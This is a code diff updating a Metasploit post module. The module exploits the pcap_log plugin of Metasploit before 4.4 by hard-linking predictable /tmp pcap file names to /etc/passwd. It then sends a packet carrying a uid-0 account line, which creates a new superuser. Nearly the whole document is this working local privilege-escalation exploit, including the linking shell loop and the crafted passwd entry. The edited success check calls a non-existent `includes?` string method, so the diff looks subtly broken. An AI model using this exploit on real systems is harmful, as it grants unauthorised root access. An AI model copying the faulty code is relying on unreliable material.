@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'msf/core/exploit/local/linux'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   Rank = ManualRanking
 
   include Msf::Post::File
@@ -20,7 +18,7 @@ class Metasploit3 < Msf::Post
         'Description'   => %q{
           Metasploit < 4.4 contains a vulnerable 'pcap_log' plugin which, when used with the default settings,
           creates pcap files in /tmp with predictable file names. This exploits this by hard-linking these
-          filenames to /etc/passwd, then sending a packet with a priviliged user entry contained within.
+          filenames to /etc/passwd, then sending a packet with a privileged user entry contained within.
           This, and all the other packets, are appended to /etc/passwd.
 
           Successful exploitation results in the creation of a new superuser account.
@@ -40,12 +38,7 @@ class Metasploit3 < Msf::Post
             [ 'URL', 'https://community.rapid7.com/docs/DOC-1946' ],
           ],
         'DisclosureDate' => "Jul 16 2012",
-        'Targets'       =>
-          [
-            [ 'Linux/Unix Universal', {} ],
-          ],
         'Stance' => Msf::Exploit::Stance::Passive,
-        'DefaultTarget' => 0,
       }
       ))
       register_options(
@@ -63,7 +56,8 @@ class Metasploit3 < Msf::Post
 
   def run
     print_status "Setting up the victim's /tmp dir"
-    initial_size = cmd_exec("cat /etc/passwd | wc -l")
+    fail_with(Failure::NotFound, '/etc/passwd not found on system') unless file_exist?('/etc/passwd')
+    initial_size = read_file("/etc/passwd").lines.count
     print_status "/etc/passwd is currently #{initial_size} lines long"
     i = 0
     j = 0
@@ -75,7 +69,7 @@ class Metasploit3 < Msf::Post
         print_status "Linking /etc/passwd to predictable tmp files (Attempt #{j})"
         cmd_exec("for i in `seq 0 120` ; do ln /etc/passwd /tmp/msf3-session_`date --date=\"\$i seconds\" +%Y-%m-%d_%H-%M-%S`.pcap ; done")
       end
-      current_size = cmd_exec("cat /etc/passwd | wc -l")
+      current_size = read_file("/etc/passwd").lines.count
       if current_size == initial_size
         # PCAP is flowing
         pkt = "\n\n" + datastore['USERNAME'] + ":" + datastore['PASSWORD'].crypt("0a") + ":0:0:Metasploit Root Account:/tmp:/bin/bash\n\n"
@@ -92,7 +86,7 @@ class Metasploit3 < Msf::Post
       i = (i+1) % 60 # increment second counter
     end
 
-    if cmd_exec("(grep Metasploit /etc/passwd > /dev/null && echo true) || echo false").include?("true")
+    if read_file("/etc/passwd").includes?("Metasploit")
       print_good("Success. You should now be able to login or su to the '" + datastore['USERNAME'] + "' account")
       # TODO: Consider recording our now-created username and password as a valid credential here.
     else
